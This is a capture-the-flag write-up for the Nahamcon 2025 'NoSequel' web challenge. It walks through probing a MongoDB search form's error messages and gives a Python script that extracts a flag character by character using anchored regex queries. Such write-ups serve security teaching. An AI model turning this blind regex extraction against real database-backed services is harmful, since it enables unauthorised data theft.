---
layout: load_md
title: The White Circle | Nahamcon 2025 | NoSequel Writeup
desc: Check out our writeup for NoSequel for Nahamcon 2025 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Nahamcon 2025
parent: nahamcon_2025
category: web
challenge: NoSequel
tags: "web, twh, mongodb, regex"
date: 2025-05-31T00:00:00+00:00
last_modified_at: 2025-05-31T00:00:00+00:00
---


> Solved by thewhiteh4t

In this challenge we had to extract the flag from a movie DB using MongoDB and a search function, as the name suggests first thought was NoSQL injections, but that was not needed as you will see.

An example search query was given : 


    title: Inception {"year": {"$gt": 1990}} title: {$regex: "The"}

Two collections were available in the dropdown and our flag is in `Flags` collection, because it's a CTF. We can figure out correct query string for Flags collection using the errors and eventually build a working query :  


    Query: a
    Error: Only regex queries are supported on the flag collection
    
    Query: {$regex: "The"}
    Error: Only regex on 'flag' field is supported
    
    Query: flag: {$regex: "The"}
    Result:  No results found matching your search criteria.
    
    Query: flag: {$regex: "flag"}
    Result: Pattern matched
    
    Query: flag: {$regex: "flag{"}
    Result: Pattern matched
    
    Query: flag: {$regex: "flag["}
    Result: No results found matching your search criteria.

So by abusing the regex filter we can extract the flag character by character, to automate the process I wrote a python script, the script will bruteforce each character and when it gets expected response, it will update the flag variable and continue with the next character and so on until it extracts all 32 characters of the flag


    #!/usr/bin/env python3
    
    import string
    import requests
    
    url = 'http://challenge.nahamcon.com:31735/search'
    flag = 'flag{'
    charset = []
    charset.extend(list(string.digits))
    charset.extend(list(string.ascii_lowercase))
    
    while len(flag) != 37:
            for char in charset:
                    payload = {
                            'query': 'flag: {$regex: "^' + flag + char + '"}',
                            'collection': 'flags'
                    }
    
                    rqst = requests.post(url, data=payload)
                    output = rqst.text
    
                    if 'Pattern matched' in output:
                            flag += char
                            print(flag)
    
    print(flag + '}')

As you can see the script generates brute force art with the flag at the end : 


![](https://i.imgur.com/HQrZmZU.png)


**Key Learning and Takeaways**


- Error Messages are Your Friend : When trying to figure out the right query for the "Flags" collection, the server's error messages were gold. They guided us, bit by bit, to understand the exact syntax and structure it expected.
- The Power of Regex : The search function supported regular expressions, and that's where the magic happened. Instead of trying to guess the whole flag at once, we could use regex to ask the database, Does the flag start with 'a' ? How about 'b' ? Does the next character match 'c' ?
- Automation : This challenge screamed for a script. Our Python script systematically found each character, confirming it, and then moving to the next, saving lot of time.


